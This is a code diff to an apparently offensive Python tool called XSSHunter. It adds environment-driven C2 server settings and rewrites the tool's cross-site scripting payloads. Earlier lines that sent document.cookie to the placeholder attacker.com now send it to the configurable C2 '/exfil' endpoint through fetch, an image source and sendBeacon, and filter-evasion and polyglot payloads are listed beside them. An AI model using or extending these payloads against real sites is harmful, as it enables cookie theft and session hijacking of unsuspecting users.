@@ -5,6 +5,7 @@ Advanced Cross-Site Scripting vulnerability detection and exploitation
 
 import asyncio
 import aiohttp
+import os
 from typing import List, Dict, Any, Optional
 from urllib.parse import urljoin, urlparse, parse_qs, urlencode
 import re
@@ -20,6 +21,11 @@ class XSSHunter:
         self.workspace_dir = workspace_dir
         self.vulnerabilities = []
         self.tested_urls = set()
+        
+        # Get C2 configuration from environment
+        c2_domain = os.getenv('C2_DOMAIN', 'localhost:8000')
+        c2_protocol = os.getenv('C2_PROTOCOL', 'http')
+        self.c2_url = f"{c2_protocol}://{c2_domain}"
         
         # XSS Payloads - จากพื้นฐานไปขั้นสูง
         self.payloads = [
@@ -59,10 +65,10 @@ class XSSHunter:
             "<img src=x onerror=\\u0061lert('XSS')>",
             "<svg/onload=alert('XSS')>",
             
-            # Advanced exploitation
-            "<script>fetch('http://attacker.com?c='+document.cookie)</script>",
-            "<script>new Image().src='http://attacker.com?c='+document.cookie</script>",
-            "<script>window.location='http://attacker.com?c='+document.cookie</script>",
+            # Advanced exploitation - Cookie exfiltration to C2 server
+            f"<script>fetch('{self.c2_url}/exfil?c='+document.cookie)</script>",
+            f"<script>new Image().src='{self.c2_url}/exfil?c='+document.cookie</script>",
+            f"<script>navigator.sendBeacon('{self.c2_url}/exfil',document.cookie)</script>",
             
             # Polyglot payloads
             "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
